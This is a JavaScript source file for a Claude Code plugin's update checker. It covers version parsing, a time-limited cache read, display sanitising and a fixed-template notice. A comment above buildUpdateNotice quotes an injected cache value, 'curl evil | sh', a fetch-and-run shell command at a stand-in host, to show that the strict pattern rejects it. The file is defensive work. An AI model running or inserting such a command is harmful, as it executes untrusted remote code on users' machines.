// Modified from xai-org/grok-build-plugin-cc@5a9f924 by Kai Wedekind, 2026.
// Apache-2.0 section 4(b) notice; see NOTICE and CHANGELOG.md for what changed.
//
// Telling the user a newer version exists — and, far more carefully, never telling them they
// are current when we cannot tell.
//
// 0.3.2's own release notes admit this gap and then fixed the documentation instead of the
// thing. Anyone still on 0.3.0 or 0.3.1 is running the build whose SessionStart hook grows
// CLAUDE_ENV_FILE without bound until the user's Bash tool stops working entirely — and the
// error names bash, not this plugin, so it is not attributable from the outside.
//
// ⚠ THE GOVERNING RULE, and every branch here is shaped by it: **failure is `unknown`, never
// `current`.** "You are up to date" when we could not check is the false green this whole
// release exists to remove, and it is worse than silence, because it stops the user looking.
//
// 🚫 The cache this reads is UNTRUSTED INPUT. On POSIX the fallback state root can live in a
// world-writable /tmp under a predictable per-user name (see the threat model at the foot of
// state.mjs), so anything read from it is treated as hostile: parsed defensively, matched
// against a strict pattern, and interpolated into a fixed template — never concatenated into
// a message and never placed into Claude's context.

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { resolveStateRoot } from "./state.mjs";

export const RELEASES_API =
  "https://api.github.com/repos/kai-wedekind/claude-code-grok-bridge/releases/latest";
export const RELEASES_URL =
  "https://github.com/kai-wedekind/claude-code-grok-bridge/releases/latest";

export const SCHEMA_VERSION = 1;
export const SUCCESS_INTERVAL_MS = 6 * 60 * 60 * 1000;
export const FAILURE_BASE_MS = 60 * 60 * 1000;
export const FAILURE_MAX_MS = 24 * 60 * 60 * 1000;
export const CACHE_READ_BUDGET_MS = 250;
export const FETCH_TIMEOUT_MS = 3000;
export const SESSION_END_FETCH_CUTOFF_MS = 20000;

// Deliberately strict, and applied to the value that comes OUT of the cache before it reaches
// any user-visible string. A tag is three numbers and an optional prerelease; anything else is
// not rendered at all.
const SAFE_VERSION_PATTERN = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/;

/**
 * Parse a version, or say you cannot.
 *
 * Returns null rather than throwing, and null propagates to `unknown` rather than to a verdict.
 * Leading zeros are ACCEPTED here even though scripts/bump-version.mjs rejects them: that is an
 * authoring gate whose job is to refuse, while this function's job is to answer, and a spurious
 * `unknown` here silently suppresses a real notification.
 */
export function parseVersion(raw) {
  if (typeof raw !== "string") return null;
  let text = raw.trim();
  if (text.startsWith("v") || text.startsWith("V")) text = text.slice(1);
  if (text === "") return null;
  const match = /^(\d+)\.(\d+)(?:\.(\d+))?(?:-([0-9A-Za-z.-]+))?(?:\+[0-9A-Za-z.-]+)?$/.exec(text);
  if (!match) return null;
  const major = Number(match[1]);
  const minor = Number(match[2]);
  // "0.3" means "0.3.0" — a missing component is zero, not a parse failure.
  const patch = match[3] === undefined ? 0 : Number(match[3]);
  if (![major, minor, patch].every((n) => Number.isSafeInteger(n))) return null;
  // Build metadata carries no precedence, so it is discarded rather than compared.
  return { major, minor, patch, prerelease: match[4] ?? null };
}

/**
 * Where the running build stands relative to the latest release.
 *
 * ⚠ `unknown` is the DEFAULT RETURN, not a fallthrough, and that is the structural point. The
 * natural shape — `if (a > b) …; if (a < b) …; return "current"` — returns `current` on any
 * NaN, because both comparisons are false. Garbage in, false green out, and nothing throws.
 */
export function compareRunning(running, released) {
  const a = parseVersion(running);
  const b = parseVersion(released);
  if (!a || !b) return "unknown";

  for (const key of ["major", "minor", "patch"]) {
    if (a[key] < b[key]) return "behind";
    if (a[key] > b[key]) return "ahead";
  }

  // Cores equal. A prerelease precedes its own release: 0.4.0-rc.1 is behind 0.4.0.
  if (!a.prerelease && !b.prerelease) return "current";
  if (a.prerelease && !b.prerelease) return "behind";
  // Never offer a release-channel user a release candidate.
  if (!a.prerelease && b.prerelease) return "ahead";
  if (a.prerelease === b.prerelease) return "current";
  // Two different prereleases of the same core. Ordering them needs rules nobody here has
  // agreed; say so rather than guess.
  return "unknown";
}

/**
 * Which version is actually running — from the install directory's own name, with no I/O.
 *
 * ⚠ NOT from `.claude-plugin/plugin.json` inside the install, and this is the single most
 * important decision in the file. Measured 2026-08-08: the installed directory is
 * `…/grok-build/0.3.0` while the manifest inside it says `0.3.2`, because deploy-local.sh
 * copies the working tree's `*.json` over the install. Reading that manifest compares 0.3.2
 * against a latest release of 0.3.2 and says nothing — a silent "current" over a three-version
 * gap, which is precisely the defect this module exists to prevent.
 *
 * ⚠ NOT from installed_plugins.json either: that is an unbounded read of a $HOME path, and its
 * `version` sits in an array whose entries need a heuristic to choose between.
 *
 * The caller passes its own `import.meta.url`, and every caller lives in `<version>/scripts/`,
 * so two dirnames reach the version directory. A checkout (basename `grok-build`) or a
 * commit-sha directory fails the parse and yields null → silence. That degradation is what
 * makes it safe to rest on a naming convention.
 */
export function resolveRunningVersion(metaUrl) {
  try {
    const scriptsDir = path.dirname(fileURLToPath(metaUrl));
    const candidate = path.basename(path.dirname(scriptsDir));
    return parseVersion(candidate) ? candidate : null;
  } catch {
    return null;
  }
}

export function resolveUpdateCacheFile() {
  return path.join(resolveStateRoot(), "update-check.json");
}

function readVersionFrom(file) {
  try {
    const value = JSON.parse(fs.readFileSync(file, "utf8"))?.version;
    return typeof value === "string" && value.trim() ? value.trim() : null;
  } catch {
    return null;
  }
}

/** Windows is case-insensitive and the registry stores backslashes; compare accordingly. */
function samePath(a, b) {
  if (typeof a !== "string" || typeof b !== "string") {
    return false;
  }
  try {
    const norm = (p) => path.resolve(p).replace(/[\\/]+$/, "").toLowerCase();
    return norm(a) === norm(b);
  } catch {
    return false;
  }
}

/**
 * What the running build actually IS, as opposed to what any single file claims.
 *
 * Three sources name a version and they are free to disagree: the directory the code was
 * loaded from, the manifest sitting inside that directory, and Claude Code's registry. A
 * local deploy that copies a working tree's `*.json` over an installed plugin moves the
 * second without the first or third, so the loaded code and its stated version drift apart
 * with nothing anywhere saying so. Measured on this machine 2026-08-09: install path and
 * registry both `0.3.0`, the manifest inside that directory `0.3.2` — five days and three
 * versions of divergence that `check` could not see.
 *
 * Every read is best-effort and every unknown stays `null`. A missing registry is normal —
 * a checkout has none — so absence is never reported as disagreement. Only two values that
 * are both present and different count, which is what keeps this quiet for developers
 * running from a clone.
 */
export function describeInstallIdentity(metaUrl, options = {}) {
  const empty = {
    installDir: null,
    directoryVersion: null,
    manifestVersion: null,
    registryVersion: null,
    disagreements: []
  };

  let installDir = null;
  try {
    installDir = path.dirname(path.dirname(fileURLToPath(metaUrl)));
  } catch {
    return empty;
  }

  const basename = path.basename(installDir);
  const directoryVersion = parseVersion(basename) ? basename : null;
  const manifestVersion =
    readVersionFrom(path.join(installDir, ".claude-plugin", "plugin.json")) ??
    readVersionFrom(path.join(installDir, "plugin.json"));

  // The registry keys plugins by `<name>@<marketplace>` and holds an array of installs per
  // key, so match on the install PATH rather than guessing a key — the marketplace was
  // already renamed once, and a key-based lookup would have gone quietly blind that day.
  let registryVersion = null;
  const registryFile =
    options.registryFile === undefined
      ? path.join(os.homedir(), ".claude", "plugins", "installed_plugins.json")
      : options.registryFile;
  if (registryFile !== null) {
    try {
      const registry = JSON.parse(fs.readFileSync(registryFile, "utf8"));
      for (const installs of Object.values(registry?.plugins ?? {})) {
        for (const entry of Array.isArray(installs) ? installs : []) {
          if (samePath(entry?.installPath, installDir) && typeof entry?.version === "string") {
            registryVersion = entry.version;
          }
        }
      }
    } catch {
      registryVersion = null;
    }
  }

  // ⚠ Compare versions as VERSIONS, not as strings. `v0.3.3`, `0.3.3` and `0.3.3+build.7` name
  // the same build, and this file already knows that — `parseVersion` strips the `v` and
  // discards build metadata, and `compareRunning` has relied on it since it was written. The
  // three sources here arrive by different routes: a directory NAME, a manifest field, and
  // whatever an installer chose to write into the registry. A raw `!==` turns any cosmetic
  // difference between them into a reported disagreement, and this function feeds `check`,
  // which is the command people run precisely when they suspect their install is wrong. A
  // false alarm there is worse than silence: it sends someone reinstalling a healthy plugin.
  //
  // Unparseable strings fall back to a trimmed literal comparison — that is all the meaning
  // available — and a difference is still reported, because two unreadable versions that do
  // not match is a real thing to say. Found by audit 2026-08-09.
  const sameVersion = (left, right) => {
    const a = parseVersion(left);
    const b = parseVersion(right);
    if (a && b) {
      return (
        a.major === b.major &&
        a.minor === b.minor &&
        a.patch === b.patch &&
        (a.prerelease ?? "") === (b.prerelease ?? "")
      );
    }
    return left.trim() === right.trim();
  };

  const disagreements = [];
  for (const [leftName, left, rightName, right] of [
    ["install directory", directoryVersion, "manifest", manifestVersion],
    ["install directory", directoryVersion, "registry", registryVersion],
    ["manifest", manifestVersion, "registry", registryVersion]
  ]) {
    if (left && right && !sameVersion(left, right)) {
      disagreements.push(`${leftName} says ${left}, ${rightName} says ${right}`);
    }
  }

  return { installDir, directoryVersion, manifestVersion, registryVersion, disagreements };
}

/**
 * The opt-out. Read from the hook's OWN environment — never through the child allowlist, which
 * SECURITY.md documents as the trap that makes a switch look present and act inert.
 */
export function isUpdateCheckDisabled(env = process.env) {
  const raw = env?.GROK_CC_UPDATE_CHECK;
  if (typeof raw !== "string") return false;
  return ["0", "off", "false", "no"].includes(raw.trim().toLowerCase());
}

/**
 * Read the cache without ever being able to block the session.
 *
 * ⚠ Never `readFileSync`. A synchronous read is bounded by the KERNEL, not by the hook's 5 s
 * budget: measured at 21.0 seconds against an unroutable UNC path, and the state root is a
 * host-supplied path that can be exactly that. The losing promise keeps the event loop
 * referenced for as long as the kernel holds it, which is why callers must exit explicitly
 * rather than wait for the loop to drain.
 */
export async function readCacheBounded(timeoutMs = CACHE_READ_BUDGET_MS, file = null) {
  const target = file ?? resolveUpdateCacheFile();
  let timer = null;
  try {
    const outcome = await Promise.race([
      fs.promises.readFile(target, "utf8").then(
        (text) => ({ text }),
        (error) => ({ error })
      ),
      new Promise((resolve) => {
        timer = setTimeout(() => resolve({ error: new Error("timeout") }), timeoutMs);
      })
    ]);
    if (outcome.error) return { cache: null, error: outcome.error };
    // Every ordinary Windows edit writes a BOM, and JSON.parse rejects one.
    const text = outcome.text.replace(/^﻿/, "");
    const parsed = JSON.parse(text);
    if (!parsed || typeof parsed !== "object" || parsed.schemaVersion !== SCHEMA_VERSION) {
      // An unknown shape is treated as absent WHOLE. Reading individual fields out of a
      // structure we do not recognise is how a future field gets misinterpreted as this one.
      return { cache: null, error: new Error("unrecognised cache schema") };
    }
    return { cache: parsed, error: null };
  } catch (error) {
    return { cache: null, error };
  } finally {
    if (timer) clearTimeout(timer);
  }
}

/**
 * What we are entitled to say, given a cache and a running version.
 *
 * Note which fields govern what: `lastSuccessAt` and `latestVersion` decide whether the value
 * may be BELIEVED, while `lastAttemptAt` and `failureStreak` decide only when to fetch NEXT.
 * Splitting them means a later failure never erases a real update we already know about.
 *
 * There is deliberately no read-side staleness gate. A stale success can only under-report —
 * say 0.3.2 when 0.3.4 exists — and under-reporting is silence, which is safe. Expiring it
 * would convert a usable answer into `unknown` for no gain.
 */
export function evaluateUpdateState(cache, running, now = Date.now()) {
  const base = { state: "unknown", running: running ?? null, latest: null, reason: "", stale: false };
  if (!running) return { ...base, reason: "the running version could not be determined" };
  if (!cache) return { ...base, reason: "no check has run yet" };
  if (!cache.lastSuccessAt) {
    // ⚠ SANITISED, because this string comes out of the cache and the cache is untrusted. It
    // reaches `check`'s rendered output, where a raw value with newlines or ANSI escapes breaks
    // out of its single bullet and can forge lines that look like the report's own — a fake
    // "Status: ready" among them. The notice path was already safe (fixed template, strict
    // version pattern); this surface was not, and an audit found the asymmetry 2026-08-08.
    return { ...base, reason: `the last check failed: ${sanitiseForDisplay(cache.error)}` };
  }
  const latest = typeof cache.latestVersion === "string" ? cache.latestVersion.trim() : "";
  if (!SAFE_VERSION_PATTERN.test(latest)) {
    return { ...base, reason: "the release tag could not be parsed" };
  }

  const state = compareRunning(running, latest);
  // ⚠ A verdict that could not be reached is `unknown`, and it must SAY the right reason.
  // Previously this returned an empty reason here, and the renderer's fallback text then
  // announced "no check has run yet" — which is a different, false explanation. The check ran;
  // it was one of the two versions that would not parse.
  if (state === "unknown") {
    return { ...base, latest, reason: "the running version could not be compared to the release" };
  }

  // ⚠ AGE MATTERS FOR `current` AND ONLY FOR `current`, and this is the asymmetry that took an
  // audit to see. `behind` from an old cache is still true — the release it names really was
  // published, and a newer one only makes the notice more right. But `current` is a POSITIVE
  // claim about the present, and a cache from three months ago cannot support it: upstream may
  // have shipped twice since. The original comment here said under-reporting is "silence, which
  // is safe" — true of the notice path, false of `check`, which prints the word "current".
  const observedAt = Date.parse(cache.lastSuccessAt);
  const ageMs = Number.isNaN(observedAt) ? null : Math.max(0, now - observedAt);
  const stale = ageMs === null || ageMs > CURRENT_CLAIM_MAX_AGE_MS;

  return { state, running, latest, reason: "", stale, ageMs, checkedAt: cache.lastSuccessAt };
}

/**
 * Make an untrusted string safe to put on one line of a report.
 *
 * Strips C0 and C1 control characters — which covers newlines, carriage returns and the ESC
 * that starts every ANSI sequence — collapses runs of whitespace, and caps the length. Without
 * this, a cache field can inject lines into `check`'s output that read as the report's own.
 */
export function sanitiseForDisplay(value, maxLength = 120) {
  if (typeof value !== "string" || value.trim() === "") return "reason unrecorded";
  // eslint-disable-next-line no-control-regex
  const stripped = value.replace(/[\u0000-\u001F\u007F-\u009F]/g, " ").replace(/\s+/g, " ").trim();
  if (stripped === "") return "reason unrecorded";
  return stripped.length > maxLength ? `${stripped.slice(0, maxLength - 1)}…` : stripped;
}

/** How old a successful observation may be and still support the word "current". */
export const CURRENT_CLAIM_MAX_AGE_MS = 24 * 60 * 60 * 1000;

/** "3 hours", "2 days" — for saying when we last actually looked. */
export function describeAge(ageMs) {
  if (typeof ageMs !== "number" || !Number.isFinite(ageMs) || ageMs < 0) return "an unknown time";
  const minutes = Math.floor(ageMs / 60000);
  if (minutes < 1) return "less than a minute";
  if (minutes < 60) return `${minutes} minute${minutes === 1 ? "" : "s"}`;
  const hours = Math.floor(minutes / 60);
  if (hours < 48) return `${hours} hour${hours === 1 ? "" : "s"}`;
  const days = Math.floor(hours / 24);
  return `${days} day${days === 1 ? "" : "s"}`;
}

/**
 * Ask GitHub for the latest release. One unauthenticated GET, no body, no identifiers.
 *
 * ⚠ `res.ok` is checked BEFORE the body is touched, and that is not defensive style — measured
 * 2026-08-08, a 404 returns **valid JSON with no `tag_name`**. Code that only guards against a
 * thrown error reads `undefined` and stores it, and the next session reports no update. Only
 * the status distinguishes "nothing newer" from "we asked the wrong question".
 *
 * ⚠ The timeout is mandatory, not defensive: Node's global fetch ignores HTTPS_PROXY, so on a
 * proxy-mandatory network the request goes direct into a DROP rule, and undici's own headers
 * timeout is 300 s — far past any hook budget.
 */
export async function fetchLatestVersion(options = {}) {
  const timeoutMs = options.timeoutMs ?? FETCH_TIMEOUT_MS;
  const doFetch = options.fetchImpl ?? (typeof fetch === "function" ? fetch : null);
  if (!doFetch) return { ok: false, latestVersion: null, error: "fetch unavailable" };
  try {
    const res = await doFetch(RELEASES_API, {
      signal: AbortSignal.timeout(timeoutMs),
      redirect: "follow",
      headers: {
        accept: "application/vnd.github+json",
        "user-agent": `grok-build/${options.running ?? "unknown"}`
      }
    });
    if (!res.ok) return { ok: false, latestVersion: null, error: `HTTP ${res.status}` };
    const body = await res.json();
    const tag = body?.tag_name;
    const parsed = typeof tag === "string" ? parseVersion(tag) : null;
    if (!parsed) return { ok: false, latestVersion: null, error: "unexpected response" };
    const normalised = `${parsed.major}.${parsed.minor}.${parsed.patch}${parsed.prerelease ? `-${parsed.prerelease}` : ""}`;
    return { ok: true, latestVersion: normalised, error: null };
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    return { ok: false, latestVersion: null, error: message.slice(0, 120) };
  }
}

/**
 * Is another fetch due? The unauthenticated GitHub limit is 60 per hour per IP (measured), so
 * this is a real budget rather than a politeness.
 */
export function isFetchDue(cache, now = Date.now()) {
  if (!cache) return true;
  const attempted = Date.parse(cache.lastAttemptAt ?? "");
  if (Number.isNaN(attempted)) return true;
  const age = now - attempted;
  // Clock moved backwards — refetch rather than freeze until the future catches up.
  if (age < 0) return true;
  if (cache.status === "ok") return age >= SUCCESS_INTERVAL_MS;
  const streak = Number.isInteger(cache.failureStreak) && cache.failureStreak > 0 ? cache.failureStreak : 1;
  const backoff = Math.min(FAILURE_BASE_MS * 2 ** (streak - 1), FAILURE_MAX_MS);
  return age >= backoff;
}

/**
 * Fold a fetch outcome into the next cache record.
 *
 * A failure advances `lastAttemptAt` (or the retry storms) while preserving `lastSuccessAt` and
 * `latestVersion` (or a network blip erases an update we correctly found yesterday).
 */
export function recordFetchResult(previous, result, now = Date.now()) {
  const stamp = new Date(now).toISOString();
  if (result.ok) {
    return {
      schemaVersion: SCHEMA_VERSION,
      lastAttemptAt: stamp,
      lastSuccessAt: stamp,
      latestVersion: result.latestVersion,
      status: "ok",
      error: null,
      failureStreak: 0
    };
  }
  const priorLatest =
    previous && typeof previous.latestVersion === "string" && SAFE_VERSION_PATTERN.test(previous.latestVersion.trim())
      ? previous.latestVersion.trim()
      : null;
  const priorStreak = Number.isInteger(previous?.failureStreak) && previous.failureStreak > 0 ? previous.failureStreak : 0;
  return {
    schemaVersion: SCHEMA_VERSION,
    lastAttemptAt: stamp,
    lastSuccessAt: previous?.lastSuccessAt ?? null,
    latestVersion: priorLatest,
    status: "failed",
    error: typeof result.error === "string" ? result.error.slice(0, 120) : "unknown error",
    failureStreak: priorStreak + 1
  };
}

/**
 * The one user-visible sentence, built from a FIXED template.
 *
 * Both numbers are re-validated against the strict pattern immediately before interpolation,
 * so a cache carrying `0.9.9 — run: curl evil | sh` produces nothing at all rather than a
 * message. Returns null whenever there is nothing honest to say.
 */
export function buildUpdateNotice(evaluation) {
  if (!evaluation || evaluation.state !== "behind") return null;
  const running = String(evaluation.running ?? "").trim();
  const latest = String(evaluation.latest ?? "").trim();
  if (!SAFE_VERSION_PATTERN.test(running) || !SAFE_VERSION_PATTERN.test(latest)) return null;
  return (
    `grok-build ${latest} is available; this session is running ${running}. ` +
    `Release notes: ${RELEASES_URL} — run /grok-build:check for details. ` +
    `Set GROK_CC_UPDATE_CHECK=0 to silence this.`
  );
}
